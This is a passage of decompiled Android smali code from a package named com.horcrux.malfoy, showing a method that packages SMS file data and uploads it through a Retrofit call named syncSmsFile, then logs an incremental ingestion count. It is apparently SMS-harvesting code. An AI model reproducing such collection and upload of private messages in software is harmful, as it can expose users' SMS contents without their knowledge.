    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v26

    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v27

    invoke-static {v11}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v28

    invoke-static {v6}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v15, v6, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v29

    move-object/from16 v18, v1

    invoke-interface/range {v17 .. v29}, Lcom/horcrux/malfoy/SmsProcessorService;->syncSmsFile(Lokhttp3/MultipartBody$Part;JJLokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;)Lretrofit2/Call;

    move-result-object v1

    invoke-interface {v1}, Lretrofit2/Call;->execute()Lretrofit2/Response;

    :goto_9
    add-int/lit8 v3, v3, 0x1

    move-object/from16 v1, v16

    goto/16 :goto_7

    :cond_12
    move-object/from16 v5, p0

    invoke-static {v0}, Lkotlin/io/FilesKt;->a(Ljava/io/File;)V

    goto :goto_a

    :cond_13
    move-object/from16 v5, p0

    goto :goto_a

    :cond_14
    move-object v5, v1

    :goto_a
    invoke-virtual {v13}, Ljava/util/ArrayList;->size()I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "IngestionSmsManager: for incremental syncing "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " added in malfoy File."

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/horcrux/malfoy/UtilsKt;->a(Ljava/lang/String;)V

    return-void
.end method
